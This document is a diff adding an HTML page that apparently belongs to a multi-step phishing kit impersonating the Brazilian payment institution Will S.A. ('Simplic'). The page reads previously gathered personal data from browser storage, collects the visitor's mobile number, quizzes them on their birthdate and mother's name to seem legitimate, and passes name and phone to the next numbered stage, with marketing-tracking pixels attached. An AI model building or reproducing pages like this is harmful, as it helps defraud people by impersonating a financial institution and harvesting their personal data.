@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simplic - Confirmação de Dados</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="container py-2">
+            <div class="d-flex justify-content-between align-items-center">
+                <div class="logo d-flex align-items-center">
+                    <img src="images/willlogo.png" alt="Simplic Logo" class="logo-img">
+                </div>
+                <div class="menu-icons">
+                    <svg class="info-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#333333" stroke-width="2"></circle>
+                        <path d="M12 7V12M12 16V16.01" stroke="#333333" stroke-width="2" stroke-linecap="round"></path>
+                    </svg>
+                    <svg class="menu-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 6V6.01M12 12V12.01M12 18V18.01" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="confirmation-card">
+                <!-- Telefone -->
+                <div id="phone-step" class="form-step">
+                    <h2 class="confirmation-title">Confirmação de Dados</h2>
+                    <p class="confirmation-text">Para sua segurança, precisamos confirmar algumas informações.</p>
+                    
+                    <div id="notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="notification-message"></span>
+                    </div>
+                    
+                    <form id="phone-form" class="mt-4">
+                        <div class="mb-4">
+                            <label for="phone" class="form-label">Telefone Celular</label>
+                            <input type="text" class="form-control form-control-lg" id="phone" placeholder="(00) 00000-0000" maxlength="15" required="">
+                            <div class="form-text">Precisamos de um número válido para enviar o código de verificação.</div>
+                        </div>
+                        <button type="submit" class="btn btn-success btn-lg w-100" id="phone-verify-button">
+                            Continuar
+                        </button>
+                    </form>
+                </div>
+
+                <!-- nascimento -->
+                <div id="birthdate-step" class="form-step" style="display: none;">
+                    <h2 class="confirmation-title">Confirme sua Data de Nascimento</h2>
+                    <p class="confirmation-text">Selecione a opção que corresponde à sua data de nascimento:</p>
+                    
+                    <div id="birthdate-notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="birthdate-notification-message"></span>
+                    </div>
+                    
+                    <div id="birthdate-options" class="options-container"></div>
+                    
+                    <div class="d-flex justify-content-between mt-4">
+                        <button class="btn btn-outline-secondary btn-lg" id="birthdate-back-button">Voltar</button>
+                    </div>
+                </div>
+
+                <!-- mãe -->
+                <div id="mother-step" class="form-step" style="display: none;">
+                    <h2 class="confirmation-title">Confirme o Nome da sua Mãe</h2>
+                    <p class="confirmation-text">Selecione a opção que corresponde ao nome da sua mãe:</p>
+                    
+                    <div id="mother-notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="mother-notification-message"></span>
+                    </div>
+                    
+                    <div id="mother-options" class="options-container"></div>
+                    
+                    <div class="d-flex justify-content-between mt-4">
+                        <button class="btn btn-outline-secondary btn-lg" id="mother-back-button">Voltar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-bottom py-3 text-center">
+                <p class="mb-1">© 2025 Will S.a. Instituicao de Pagamento - Todos os direitos reservados.</p>
+                <p class="mb-1">CNPJ: 36.272.465/0001-49</p>
+                <p class="mb-0"><a href="#" class="text-white">Política de Privacidade</a> | <a href="#" class="text-white">Termos de Uso</a></p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/all.min.js"></script>
+    <script src="js/pixel.js"></script>
+    <script>
+        const userDataString = localStorage.getItem('dadosUsuario');
+        let userData;
+        try {
+            if (!userDataString) {
+                window.location.href = '../2/index.html';
+            }
+            userData = JSON.parse(userDataString);
+        } catch (error) {
+            window.location.href = '../2/index.html';
+        }
+        
+        document.getElementById('phone').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                value = value.replace(/(\d)(\d{4})$/, '$1-$2');
+            }
+            if (value.length > 15) value = value.substring(0, 15);
+            e.target.value = value;
+        });
+        
+        document.getElementById('phone-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phoneDigits = document.getElementById('phone').value.replace(/\D/g, '');
+            if (phoneDigits.length < 10) {
+                alert("Por favor, insira um número de telefone válido");
+                return;
+            }
+            localStorage.setItem('tel', document.getElementById('phone').value); // com máscara
+            localStorage.setItem('telDigits', phoneDigits); // só números
+            document.getElementById('phone-step').style.display = 'none';
+            prepareAndShowBirthdateOptions();
+        });
+
+        function prepareAndShowBirthdateOptions() {
+            const birthdateOptions = document.getElementById('birthdate-options');
+            birthdateOptions.innerHTML = '';
+            let correctBirthdate = userData.NASCIMENTO && userData.NASCIMENTO.trim() !== '' ? userData.NASCIMENTO : 'Nenhuma das alternativas';
+            const options = generateRandomDates(correctBirthdate);
+            shuffleArray(options);
+            options.forEach(date => {
+                const optionCard = document.createElement('div');
+                optionCard.className = 'option-card';
+                optionCard.dataset.value = date;
+                optionCard.innerHTML = date;
+                optionCard.addEventListener('click', function() {
+                    if (this.dataset.value === correctBirthdate) {
+                        document.getElementById('birthdate-step').style.display = 'none';
+                        prepareAndShowMotherOptions();
+                    } else {
+                        alert("Data incorreta");
+                    }
+                });
+                birthdateOptions.appendChild(optionCard);
+            });
+            document.getElementById('birthdate-step').style.display = 'block';
+        }
+
+        function generateRandomDates(correctDate) {
+            const options = ['Nenhuma das alternativas'];
+            if (correctDate !== 'Nenhuma das alternativas') options.push(correctDate);
+            while (options.length < 4) {
+                const randomDate = `${String(Math.floor(Math.random() * 28) + 1).padStart(2,'0')}/${String(Math.floor(Math.random() * 12) + 1).padStart(2,'0')}/${1980+Math.floor(Math.random()*30)}`;
+                if (!options.includes(randomDate)) options.push(randomDate);
+            }
+            return options;
+        }
+
+        function prepareAndShowMotherOptions() {
+            const motherOptions = document.getElementById('mother-options');
+            motherOptions.innerHTML = '';
+            let correctMother = userData.MAE && userData.MAE.trim() !== '' ? userData.MAE.toUpperCase() : 'Nenhuma das alternativas';
+            const options = generateRandomNames(correctMother);
+            shuffleArray(options);
+            options.forEach(name => {
+                const optionCard = document.createElement('div');
+                optionCard.className = 'option-card';
+                optionCard.dataset.value = name;
+                optionCard.innerHTML = name;
+                optionCard.addEventListener('click', function() {
+                    if (this.dataset.value === correctMother) {
+                        const params = getUrlParams();
+                        if (userData.nome) params.name = userData.nome;
+                        const telMask = localStorage.getItem('tel');
+                        const telDigits = localStorage.getItem('telDigits');
+                        if (telMask) params.phone = telMask;
+                        if (telDigits) params.telephone = telDigits;
+                        const url = new URL('../4/index.html', window.location.href);
+                        Object.keys(params).forEach(k => url.searchParams.append(k, params[k]));
+                        window.location.href = url.toString();
+                    } else {
+                        alert("Nome incorreto");
+                    }
+                });
+                motherOptions.appendChild(optionCard);
+            });
+            document.getElementById('mother-step').style.display = 'block';
+        }
+
+        function generateRandomNames(correctName) {
+            const options = ['Nenhuma das alternativas'];
+            if (correctName !== 'Nenhuma das alternativas') options.push(correctName);
+            const nomes = ["MARIA SILVA","ANA SANTOS","JULIANA OLIVEIRA","FERNANDA SOUZA"];
+            while (options.length < 4) {
+                const n = nomes[Math.floor(Math.random()*nomes.length)];
+                if (!options.includes(n)) options.push(n);
+            }
+            return options;
+        }
+
+        function shuffleArray(arr) {
+            for (let i=arr.length-1;i>0;i--) {
+                const j=Math.floor(Math.random()*(i+1));
+                [arr[i],arr[j]]=[arr[j],arr[i]];
+            }
+        }
+
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            for (const [key, value] of urlParams) params[key] = value;
+            return params;
+        }
+    </script>
+
+<script>
+  window.pixelId = "68cf86530ee8895acecf4b7b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+</body></html>
